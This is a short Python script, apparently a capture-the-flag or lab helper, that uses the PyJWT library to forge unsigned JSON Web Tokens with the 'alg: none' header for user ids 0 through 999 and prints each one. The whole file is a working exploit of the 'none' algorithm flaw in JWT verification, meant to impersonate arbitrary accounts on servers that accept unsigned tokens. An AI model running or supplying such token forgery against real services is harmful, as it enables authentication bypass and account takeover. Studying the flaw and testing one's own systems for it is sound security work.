import jwt
for i in range(0, 1000):
    encoded_jwt = jwt.encode({"id": i}, None, headers={"alg": "none", 'typ': "JWT"})
    print(encoded_jwt)